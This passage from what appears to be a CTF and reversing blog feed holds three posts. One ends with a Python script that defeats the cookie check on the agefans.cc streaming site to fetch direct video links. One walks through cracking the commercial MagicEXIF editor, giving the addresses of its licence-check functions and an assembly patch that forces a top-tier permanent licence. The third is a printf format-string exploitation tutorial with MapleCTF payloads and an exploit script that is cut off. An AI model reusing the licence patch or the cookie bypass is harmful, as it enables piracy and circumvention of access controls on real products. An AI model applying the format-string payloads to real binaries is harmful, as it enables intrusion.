<h1 id="keygen"><a href="#keygen" class="headerlink" title="&quot;keygen&quot;"></a>&quot;keygen&quot;</h1><p>那么知道了是如何完成验证的，那么就可以开始写解析了，先来整理一下步骤</p>
<p><em>其实k1没什么用</em></p>
<ol>
<li>访问_getplay，获得t1</li>
<li>通过以上方式获得cookie</li>
<li>加上cookie再次访问获得链接</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getcookie</span>(<span class="params">t1:<span class="built_in">int</span></span>):</span><br><span class="line">    time_now = <span class="built_in">int</span>(time.time()*<span class="number">1000</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;t1 is %d, now is %s, t1-time_now = %d&quot;</span>%(t1,time_now,t1-time_now))</span><br><span class="line">    t1_tmp = math.floor(t1 / <span class="number">1000</span> + <span class="number">0.5</span>) &gt;&gt; <span class="number">0x5</span></span><br><span class="line">    k2 = (t1_tmp * (t1_tmp % <span class="number">0x1000</span>) * <span class="number">0x3</span> + <span class="number">0x1450f</span>) * (t1_tmp % <span class="number">0x1000</span>) + t1_tmp</span><br><span class="line">    t2 = time_now</span><br><span class="line">    k2_s = <span class="built_in">str</span>(k2)</span><br><span class="line">    t2_s = <span class="built_in">str</span>(t2)</span><br><span class="line">    t2_s = t2_s[:-<span class="number">1</span>:]+k2_s[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;k2=%s&quot;</span> % k2_s)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;t2=%s&quot;</span> % t2_s)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;t2&quot;</span>:t2_s,<span class="string">&quot;k2&quot;</span>:k2_s&#125;</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://www.agefans.cc/_getplay?aid=20210249&amp;playindex=2&amp;epindex=1&quot;</span></span><br><span class="line">data = requests.head(url,headers=&#123;<span class="string">&quot;referer&quot;</span>:<span class="string">&quot;https://www.agefans.cc/&quot;</span>,&#125;)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">setcookies = data.headers.get(<span class="string">&quot;set-cookie&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(setcookies)</span><br><span class="line">t1 = <span class="built_in">int</span>(re.<span class="built_in">compile</span>(<span class="string">r&quot;t1=[^;]*;&quot;</span>).search(setcookies).group()[<span class="number">3</span>:-<span class="number">1</span>:])</span><br><span class="line"><span class="built_in">print</span>(t1)</span><br><span class="line">cookies = getcookie(t1)</span><br><span class="line">cookies[<span class="string">&quot;t1&quot;</span>] = <span class="built_in">str</span>(t1)</span><br><span class="line">data = requests.get(url,headers=&#123;<span class="string">&quot;referer&quot;</span>:<span class="string">&quot;https://www.agefans.cc/&quot;</span>,&#125;,cookies=cookies)</span><br><span class="line"><span class="built_in">print</span>(data.text)</span><br></pre></td></tr></table></figure>

<p>成功获得直链~</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Response [200]&gt;</span><br><span class="line">t1=1634231445902; Path=/, k1=586623324; Path=/</span><br><span class="line">1634231445902</span><br><span class="line">t1 is 1634231445902, now is 1634231395254, t1-time_now = 50648</span><br><span class="line">k2=99036993616128</span><br><span class="line">t2=1634231395258</span><br><span class="line"></span><br><span class="line">	&#123;</span><br><span class="line">		&quot;purl&quot;:&quot;/age/player/ckx1/?url=&quot;,</span><br><span class="line">		&quot;purlf&quot;:&quot;https://play.agefans.cc:8443/age/player/dpx/?url=&quot;,</span><br><span class="line">		&quot;vurl&quot;:&quot;https%3a%2f%2fkol%2dfans%2efp%2eps%2enetease%2ecom%2ffile%2f6159a40954eace75cb975131raYEy7we03?from%3Dysjdm.com%7Cysjdm.net&quot;,</span><br><span class="line">		&quot;playid&quot;:&quot;&lt;play&gt;web_mp4&lt;/play&gt;&quot;,</span><br><span class="line">		&quot;vurl_bak&quot;:&quot;&quot;,</span><br><span class="line">		&quot;purl_mp4&quot;:&quot;/age/player/ckx1/?url=&quot;,</span><br><span class="line">		&quot;ex&quot;:&quot;&quot;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h1><p>整这么麻烦干什么。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>anime</tag>
        <tag>reverse</tag>
        <tag>encryption</tag>
      </tags>
  </entry>
  <entry>
    <title>MagicEXIF破解思路之VB程序破解</title>
    <url>/articles/ctf/cracking-magicexif/</url>
    <content><![CDATA[<h1 id="从0开始的VB程序破解"><a href="#从0开始的VB程序破解" class="headerlink" title="从0开始的VB程序破解"></a>从0开始的VB程序破解</h1><p>上周，为了整点乐子，我打算寻找一个简单的软件来进行破解。正好某群友有一个需要破解的应用，于是这个应用就不幸的成为了我的目标。</p>
<p>开始之前先来介绍一下这个程序，<a href="https://www.magicexif.com/">MagicEXIF</a>一个非常强大的图片元数据编辑器。 分为免费版，专业版，旗舰版。 </p>
<p>安装完程序后，先来看看程序的基本信息</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_014128.jpg"></p>
<span id="more"></span>

<p>一个使用Visual Basic编写的程序，且是32位的应用。 再来看看BinaryNinja的反编译结果。</p>
<p>我的评价是惨不忍睹，各种变量混在一起使用，字符串甚至是直接存在函数体里面的，只能说挺离谱的。</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_014851.jpg"></p>
<p>总的来说，直接看反编译的代码难度较大，不是很好整。 我又尝试了IDA，结果也是一样。</p>
<p>所以我得找点别的方法</p>
<p>简单进行了一下google，发现VB的程序实际上是运行在一个类似VB虚拟机上的程序。 </p>
<p>简单来说，VB程序可以大致分为两个部分，一个为窗体部分，一个为代码部分。窗体部分主要负责软件界面的大致框架，代码部分则是由Pcode组成的一个个函数。 窗体部分通过调用不同的函数来实现不同的效果。</p>
<p>网上正好有一个decompiler可以反编译VB程序 (VB Decompiler)，我把软件本体和decompiler都拖到沙箱里开始分析。</p>
<h1 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h1><p>打开VB Decompiler, 把fast decompile的勾给去掉，等待反编译完成。</p>
<p>可以看到注册的功能是在窗体<code>frmRegister</code>下的</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_153434.jpg"></p>
<p>在code段找到对应的代码，一个个点进去进行分析，我们可以得到用户名的长度必须大于8，注册码的长度为64。（因为只有这样激活按钮才可以被按）</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_153740.jpg"><br><img data-src="/images/ctf/cracking-magicexif/2022-11-26_153852.jpg"></p>
<p>继续看激活的过程，具体代码位于<code>cmdActivate_click</code>中，可以发现一旦激活成功后，软件会将激活信息<strong>明文</strong>储存在<code>reg_info.cfg</code>文件里，这个文件包含用户名，注册码，以及注册模式。注册模式这个之后会说。</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_154638.jpg"></p>
<p>观察软件对全局变量的修改与读取，我们同样可以知道<code>0x68002c</code>储存了软件的版本信息（即未注册，专业，旗舰）。 在BN里查找code reference之后，我们也可以推断出每个版本对应的数值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x87 = 旗舰版</span><br><span class="line">0x63 = 专业版</span><br><span class="line">0x1 = 免费版</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_155237.jpg"></p>
<p>激活完成后，程序会跳出一个窗口让用户重启，在这里可以合理推断验证注册码的代码会在程序启动的时候运行。</p>
<p>因为注册信息保存在<code>reg_info.cfg</code>里，这就给了我一个很好的突破口，查找哪些函数使用了<code>reg_info.cfg</code>这个字符串。于是我们就可以顺藤摸瓜找到对应的函数<code>0x573BD0</code>。</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_164003.jpg"> </p>
<p>可以看到软件先在软件的安装目录下加载了<code>reg_info.cfg</code>文件，并读取了保存的激活信息</p>
<p>从中我们也可以在发现几个重要的全局变量，<code>0x680034</code>保存了用户名(UserName)，<code>0x680038</code>保存了注册码(ActivationCode)，<code>0x680032</code>保存了激活模式(RegMode)。</p>
<p>再来看具体的注册码验证部分，简单概括一下逻辑</p>
<p>如果注册模式(RegMode为1),那么会调用第一个验证函数<code>0x56e360</code>检查注册码，如果注册模式为0，那么则会调用第二个验证函数<code>0x56e9b0</code>。</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_215613.jpg"> </p>
<p>这两个验证函数都会返回一个值，这个值会赋值给<code>0x68002c</code>也就是软件版本。</p>
<p>同时，这两个函数也会设置<code>0x680030</code>的值。 查看这个的值的cross reference，我们可以知道这个值代表了授权模式。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 永久授权</span><br><span class="line">1 企业永久授权</span><br><span class="line">2 个人授权（时间有限）</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_221412.jpg"> </p>
<p>这也是为什么在注册码验证的那部分里，如果这个值是2(也就是不是永久验证)，他会去检查到期时间来确保验证码没有过期。</p>
<h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><p>了解了程序具体的具体验证思路，那么就可以进行破解了。</p>
<p>破解的思路比较粗暴，直接给那两个验证函数(<code>0x56e360</code>,<code>0x56e9b0</code>)打补丁，让那两个返回我们要的版本号，设置授权模式为我们想要的模式即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 设置为旗舰版（实际上没用这个代码没用</span><br><span class="line">mov word [0x68002c], 0x87 </span><br><span class="line">; 设置为企业永久激活</span><br><span class="line">mov word [0x680030], 1</span><br><span class="line">; 设置返回值为旗舰版</span><br><span class="line">xor eax,eax</span><br><span class="line">mov eax, 0x87</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_224917.jpg"> </p>
<p>然后在程序目录下新建注册信息 <code>reg_info.cfg</code></p>
<p>填入注册信息即可</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_225329.jpg"> </p>
<h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_225734.jpg"> </p>
<h1 id="未解决的问题"><a href="#未解决的问题" class="headerlink" title="未解决的问题"></a>未解决的问题</h1><p>如果我们再次用cross reference查找哪些地方调用注册码验证函数，我们发现了一个类似初始化函数的代码。</p>
<p><img data-src="/images/ctf/cracking-magicexif/2022-11-26_222539.jpg"> </p>
<p>如图所示，我们可以发现他一共调用了两次验证函数，第一次使用<code>arg3=0</code>，第二次使用<code>arg3=-1</code>。</p>
<p>奇怪的是，不管第一次的reg mode是啥，第二次都会变成0，运行一次第二个验证函数。 所以实际上只要给第二个验证函数打补丁就可以了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crack</tag>
        <tag>reverse</tag>
        <tag>visual basic</tag>
      </tags>
  </entry>
  <entry>
    <title>[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022]</title>
    <url>/articles/ctf/how-to-utilize-printf-in-pwn/</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p><strong>printf</strong> is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think it would be good if I wrote my experience about printf so that I could reinforce my understanding about printf stuff.</p>
<p>Anyway, I would try to explain as much as detail in the article in order to make it beginner friendly.</p>
<p>Hope this article can help you in printf</p>
<h1 id="0x1-What-is-printf-string-formating"><a href="#0x1-What-is-printf-string-formating" class="headerlink" title="0x1 What is printf (string formating)"></a>0x1 What is printf (string formating)</h1><p>so, string format is a way to print out data by stating its format in a string.</p>
<span id="more"></span>

<p>for example, the code below will print out <strong>&quot;Hello, printf , I&#39;m 16 year old&quot;</strong>. We can see that string &quot;%s&quot; is replace by &quot;printf&quot; and &quot;%d&quot; is replaced by 0x10 (which is 16 in decimal)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;Hello, %s , I&#x27;m %d year old&quot;,&quot;printf&quot;,0x10)</span><br></pre></td></tr></table></figure>

<p>all the character start with <strong>%</strong> is called <strong>format string</strong>, there are serveral different format string you can use in C.</p>
<p>Here is some commonly used format string, ignore <code>%n</code> for now. We will come to it later</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%d      integer</span><br><span class="line">%s      char</span><br><span class="line">%l      long int</span><br><span class="line">%ll     long long int</span><br><span class="line">%p      pointer </span><br><span class="line">%x      unsigned hexadecimal</span><br><span class="line">%n      write number of printed character in 4 byte</span><br><span class="line">%hn     write number of printed character in 2 byte</span><br><span class="line">%hhn    write number of printed character in 1 byte</span><br><span class="line"></span><br><span class="line">%10$?   use 10th parameter and print in format of ?</span><br></pre></td></tr></table></figure>

<h1 id="0x2-How-function-are-called"><a href="#0x2-How-function-are-called" class="headerlink" title="0x2 How function are called"></a>0x2 How function are called</h1><p>Before talking about the printf, first thing we need to know is how a function are called and how parameter are passed.</p>
<p>In one words, x86 push all parameter into the stack. x64 move first 6 parameter into register and push rest parameters in to the stack.</p>
<p>for example</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bar(100,200)</span><br></pre></td></tr></table></figure>

<p>In <strong>x86</strong>, the stack would look like this</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bar Stack (current)</span><br><span class="line">EBP</span><br><span class="line">EIP</span><br><span class="line">200 - para2</span><br><span class="line">100 - para1</span><br><span class="line">Pararent Stack</span><br></pre></td></tr></table></figure>

<p>While in <strong>x64</strong>, the stack would look like this and two paramter, 100 is saved in the <code>rdi</code> and 200 is saved in the <code>rsi</code>. Since there there are only two argument, there is no extra value pushed into the stack.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Bar Stack (current)</span><br><span class="line">RBP</span><br><span class="line">RIP</span><br><span class="line">Pararent Stack</span><br></pre></td></tr></table></figure>

<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_192750.jpg" alt="2022-02-02_192750.jpg"></p>
<h1 id="0x2-Read-the-stack"><a href="#0x2-Read-the-stack" class="headerlink" title="0x2 Read the stack"></a>0x2 Read the stack</h1><h2 id="basic-idea"><a href="#basic-idea" class="headerlink" title="basic idea"></a>basic idea</h2><p>Here is a simple vulnerable code, can you figure out a way to let program print out <code>*buf</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int x = 0x1337;</span><br><span class="line">  char *buf = &quot;my super secret&quot;;</span><br><span class="line">  char s[0x20];</span><br><span class="line">  printf(&quot;hello here is my number %d\n&quot;, x);</span><br><span class="line">  while (1)</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;please enter: &quot;);</span><br><span class="line">    fgets(s, 0x20, stdin);</span><br><span class="line">    puts(&quot;You Enter: &quot;);</span><br><span class="line">    printf(s); //!! here</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>printf(s)</code> give us the opportunity. As I mentioned in the Part1, the computer didn&#39;t care about what parameter you actually pass in. It read whatever is in the register and on the stack.</p>
<p>Assume you put <code>%p-%p-%p-%p</code> in the string <code>s</code>. The computer don&#39;t know you didn&#39;t pass other 4 parameter. It will just read whatever is store in the register and stack. </p>
<p>For example ,in x64, it will print out address in <code>&quot;rsi-rdx-rcx-r8&quot;</code>.</p>
<p>So, if we continue to print out, and used out all the 6 register. printf will assume there is some data in the stack, so printf will then get data from stack and print it out.</p>
<p>This give us a way off leaking data on the stack.</p>
<h2 id="verification"><a href="#verification" class="headerlink" title="verification"></a>verification</h2><p>Lets check with a debugger. </p>
<p>First before call <code>printf</code>, the stack looks like this, we can see our <code>x</code> is at rsp, and <code>buf</code> is locate right under rsp.<br><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_205224.jpg" alt="2022-02-02_205224.jpg"></p>
<p>Lets enter <code>%p%p%p%p%p %p-%s</code>.</p>
<ul>
<li>The first 5 <code>%p</code> is used for the rest of 5 registers</li>
<li>than <code>x</code> and <code>buf</code> is printed by by format <code>%p</code> and <code>%s</code></li>
</ul>
<p>We got exactly what we want<br><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_205732.jpg" alt="2022-02-02_205732.jpg"></p>
<p>we can also use <code>%p%p%p%p%p %p-%p</code> to print out the address of <code>buf</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You Enter:</span><br><span class="line">0x56206ad2e2a0(nil)0x7fdee909b1e70xc(nil) 0x1337-0x562069b06004</span><br></pre></td></tr></table></figure>

<h2 id="simpler-method"><a href="#simpler-method" class="headerlink" title="simpler method"></a>simpler method</h2><p>using <code>%p%p%p%p%p %p-%p</code> is ok when we have large input size. But what happen if we don&#39;t have enough input size.</p>
<p>We can use <code>%num$format</code> to get the same result.</p>
<p>for example, we want to get the <code>x</code> and <code>buf</code>. We know from previous, we can get x from 6th parameter and buf from 7th parameter.</p>
<p>so, we can use <code>%6$p-%7$s</code> as a substitution. And we got the same result as <code>%p%p%p%p%p %p-%s</code></p>
<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_225614.jpg" alt="2022-02-02_225614.jpg"></p>
<h1 id="0x3-Write-on-the-stack"><a href="#0x3-Write-on-the-stack" class="headerlink" title="0x3 Write on the stack"></a>0x3 Write on the stack</h1><h2 id="basic-idea-1"><a href="#basic-idea-1" class="headerlink" title="basic idea"></a>basic idea</h2><p>in order to write data by printf, We need use the <strong>debug features</strong> of printf - <code>%n</code>, <code>%hn</code>, and <code>%hhn</code>.</p>
<p>basicly, <code>%n</code> allow you write <strong>total number of character printed</strong> into a int pointer.</p>
<p>For example, following code will change x to 5 after printf.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int x = 0;</span><br><span class="line">  printf(&quot;before, x = %d\n&quot;,x); // here x = 0</span><br><span class="line">  printf(&quot;12345%n\n&quot;,&amp;x);</span><br><span class="line">  printf(&quot;after, x = %d\n&quot;,x); // this will print x = 5</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p>lets modify the example in the read. In this example, we need to find a way changing x to 0x1337.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char *buf = &quot;my super secret&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">  int *x = malloc(sizeof(int));</span><br><span class="line">  *x = 0x1336;</span><br><span class="line">  char s[0x20];</span><br><span class="line">  while (1)</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;hello here is my number 0x%x\n&quot;, *x);</span><br><span class="line">    puts(&quot;please enter: &quot;);</span><br><span class="line">    fgets(s, 0x20, stdin);</span><br><span class="line">    puts(&quot;You Enter: &quot;);</span><br><span class="line">    printf(s);</span><br><span class="line">    if (*x == 0x1337)&#123;</span><br><span class="line">      puts(buf);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Looking at this code, we can use again <code>printf(s)</code> to change value store in the *x.</p>
<p>Since x is locate under the rsp if we check the debugger, we can use <code>%7$n</code> format string to point to the x.</p>
<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_230122.jpg" alt="2022-02-02_230122.jpg"></p>
<p>then we use <code>%4919x%7$n</code> to write 0x1337 (4919) into x. (<code>%4919x</code> means pad 4919 byte, which has 4919 length)</p>
<p>we can see the value of x has been successfully changed.</p>
<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-02_230645.jpg" alt="2022-02-02_230645.jpg"></p>
<h2 id="n-hn-hhn"><a href="#n-hn-hhn" class="headerlink" title="%n? %hn? %hhn"></a>%n? %hn? %hhn</h2><p>we know that the different between them is how many bytes it write. </p>
<p>Normally, we only use <code>%hn</code> and <code>%hhn</code>. </p>
<p>Because four bytes like 0x11ffff &#x3D; 1179647 is too <strong>large</strong> for stdout to write.</p>
<p>if we take the example above and change some value</p>
<ul>
<li>if x &#x3D; 0xffffffff, use <code>%1x%7$hn</code>, x will become 0xffff0001 (two bytes have been overwrited)</li>
<li>if x &#x3D; 0xffffffff, use <code>%1x%7$hhn</code>, x will become 0xffffff01 (one bytes have been overwrited)</li>
</ul>
<p><strong>What if I wants to write more than 2 bytes</strong></p>
<p>For example, if we want to write 4 bytes (0x1011) at address 0x1002</p>
<ul>
<li>first write lower two bytes 0x11 at 0x1002</li>
<li>second write higher two bytes 0x10 at 0x1004</li>
<li>depending on the endianness, if computer use big endianness, this should be write at 0x1000</li>
</ul>
<h1 id="0x4-Example-baby-pwintf"><a href="#0x4-Example-baby-pwintf" class="headerlink" title="0x4 Example baby-pwintf"></a>0x4 Example baby-pwintf</h1><p>Lets take look at source code <a href="/images/ctf/how-to-utilize-printf-in-pwn/baby-pwintf.c">baby-pwintf.c</a></p>
<p>the vulnerability is quite obvious if you read through the whole article.</p>
<p>We just need change rating to 0x1337.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void vuln() &#123;</span><br><span class="line">    char* input = malloc(16);</span><br><span class="line">    int* rating = malloc(4);</span><br><span class="line"></span><br><span class="line">    fgets(input, 16, stdin);</span><br><span class="line">    *rating = input[0] % 11;</span><br><span class="line"></span><br><span class="line">    puts(&quot;Your name is:&quot;);</span><br><span class="line">    printf(input);</span><br><span class="line"></span><br><span class="line">    printf(&quot;I rate your name %d / 10\n&quot;, *rating);</span><br><span class="line"></span><br><span class="line">    if (*rating == 0x1337) &#123;</span><br><span class="line">        puts(&quot;Nice name! here&#x27;s a flag:&quot;);</span><br><span class="line">        win();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>part of exp.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"># 0x1337 = 4919</span><br><span class="line">io.sendlineafter(b&quot;Tell me your name and I&#x27;ll rate it!&quot;, b&quot;%4919x%7$n&quot;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>flag</strong>: maple{youwe_weady_fow_the_big_boy_chawwenge}</p>
<h1 id="0x4-Example-pwintf"><a href="#0x4-Example-pwintf" class="headerlink" title="0x4 Example pwintf"></a>0x4 Example pwintf</h1><p>Now, we understand the basic of printf. Lets do some challenge</p>
<h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX enabled</span><br><span class="line">#    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h2 id="Quick-look"><a href="#Quick-look" class="headerlink" title="Quick look"></a>Quick look</h2><p>lets take a quick look at the source code. There is a trivial vulnerability here - <code>printf(input)</code>.</p>
<p>Before exploit the binary, there still some problem we need to find solution</p>
<ol>
<li>Since the input is locate at heap. We can&#39;t write arbitrary data into the stack. </li>
<li>the program didn&#39;t provide a way to exist the while loop. And there is no ret instruction in the vuln function</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vuln() &#123;</span><br><span class="line">    puts(&quot;Wewcome b-back?!! Peopwe wewe t-twying t-to hack my pwogwam, so I stopped putting the x3 fwag in memowy ÚwÚ&quot;);</span><br><span class="line">    while(1) &#123;</span><br><span class="line">        char* input = malloc(0x100);</span><br><span class="line"></span><br><span class="line">        fgets(input, 0x100, stdin);</span><br><span class="line"></span><br><span class="line">        printf(input);</span><br><span class="line"></span><br><span class="line">        free(input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    alarm(60);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line"></span><br><span class="line">    vuln();</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>So, want can we do. There are two solution (maybe there is more but I only know two)</p>
<ol>
<li>change the rip of printf and then construct a rop chain to call one gadget</li>
<li>write rop chain to free_hook</li>
</ol>
<h2 id="change-rip-of-printf-unintended"><a href="#change-rip-of-printf-unintended" class="headerlink" title="change rip of printf (unintended)"></a>change rip of printf (unintended)</h2><p>if we look at the stack before call program call printf. We can see that the address of printf rip is just 8 bytes above the vuln stack. </p>
<p><img data-src="/images/ctf/how-to-utilize-printf-in-pwn/2022-02-03_170338.jpg" alt="2022-02-03_170338.jpg"></p>
<p>So, if we can find a way to overwrite this rip, we can use this rip to construct a rop chain.</p>
<p>Lets summarize the idea of this method</p>
<ol>
<li>first, find a memory block in the stack, make that block point to the rip of printf</li>
<li>use printf with %n, change the address of rip</li>
<li>when printf finish. It will fall into the rop chain and spawn a shell.</li>
</ol>
<p>With these step in mind, After looking at the stack, I came up with a solution.</p>
<p><em>because i&#39;m lazy, so i choose the address on the stack so that I only need to write at most 4 bytes</em></p>
<ol>
<li>change the value of (rsp+35*0x8) to (rsp + 5*0x8) using (rsp + 7*0x8)</li>
<li>change the value of (rsp+5*0x8) to one gadget address using (rsp+35*0x8)</li>
<li>change the value of (rsp+35*0x8) to (rsp - 0x8) using (rsp + 7*0x8)</li>
<li>change the value of (rsp - 0x8) to rop chain gadget address using (rsp+35*0x8)</li>
<li>use pop_rbp_r12_r13_r14_r15_ret as the the rop chain gadget, pop all unnecessary value on the stack and return to one gadget address in (rsp+5*0x8)</li>
</ol>
<h3 id="exploit-py"><a href="#exploit-py" class="headerlink" title="exploit.py"></a>exploit.py</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BinaryInfo:</span><br><span class="line">    exe = &quot;pwintf&quot;</span><br><span class="line">    libc = &quot;libc.so.6&quot;</span><br><span class="line">    # libc = &quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;</span><br><span class="line"></span><br><span class="line">    host = &quot;&quot;</span><br><span class="line">    port = 32011</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(BinaryInfo.exe)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line">if BinaryInfo.libc != &quot;&quot;:</span><br><span class="line">    libc = ELF(BinaryInfo.libc)</span><br><span class="line">    libc_rop = ROP(libc)</span><br><span class="line">else:</span><br><span class="line">    libc = None</span><br><span class="line">    libc_rop = None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or BinaryInfo.host</span><br><span class="line">port = int(args.PORT or BinaryInfo.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    return io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def start(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span><br><span class="line">    if args.LOCAL:</span><br><span class="line">        return start_local(argv, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ===========================================================</span><br><span class="line">#                    EXPLOIT GOES HERE</span><br><span class="line"># ===========================================================</span><br><span class="line">#    Arch:     amd64-64-little</span><br><span class="line">#    RELRO:    Full RELRO</span><br><span class="line">#    Stack:    No canary found</span><br><span class="line">#    NX:       NX 